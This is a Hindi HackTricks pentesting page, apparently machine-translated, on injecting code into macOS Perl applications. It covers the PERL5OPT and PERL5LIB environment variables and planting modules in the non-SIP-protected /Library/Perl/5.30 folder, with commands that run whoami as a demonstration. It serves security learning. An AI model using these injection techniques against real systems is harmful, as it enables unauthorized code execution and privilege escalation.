# macOS Perl एप्लिकेशन्स इंजेक्शन

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड github रेपो में पीआर जमा करके।

</details>

## `PERL5OPT` और `PERL5LIB` env वेरिएबल के माध्यम से

`PERL5OPT` एनवायरनमेंट वेरिएबल का उपयोग करके पर्ल को विभिन्न कमांड्स को निषेध करने की संभावना है।\
उदाहरण के लिए, इस स्क्रिप्ट बनाएं:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

अब **एनवी वेरिएबल निर्यात करें** और **पर्ल** स्क्रिप्ट को निष्पादित करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प है Perl मॉड्यूल बनाना (उदाहरण के लिए `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

और फिर env variables का उपयोग करें:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## विया डिपेंडेंसीज़

Perl चल रहे dependencies फ़ोल्डर का क्रम सूचीबद्ध करना संभव है:
```bash
perl -e 'print join("\n", @INC)'
```
क्या निम्नलिखित कुछ इस प्रकार वापस देगा:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ फोल्डर वापस लौटाए गए में से कुछ भी मौजूद नहीं है, हालांकि, **`/Library/Perl/5.30`** मौजूद है, यह **SIP** द्वारा **सुरक्षित नहीं है** और यह **SIP द्वारा सुरक्षित फोल्डरों से पहले** है। इसलिए, कोई व्यक्ति उस फोल्डर का दुरुपयोग करके वहां स्क्रिप्ट डिपेंडेंसी जोड़ सकता है ताकि एक उच्च विशेषाधिकार Perl स्क्रिप्ट इसे लोड करें।

{% hint style="warning" %}
हालांकि, ध्यान दें कि आपको **उस फोल्डर में लिखने के लिए रूट होना चाहिए** और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

उदाहरण के लिए, अगर कोई स्क्रिप्ट **`use File::Basename;`** आयात कर रहा है तो **`/Library/Perl/5.30/File/Basename.pm`** बनाना संभव होगा ताकि इसे विचारशील कोड को निष्पादित करने के लिए।

## संदर्भ

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
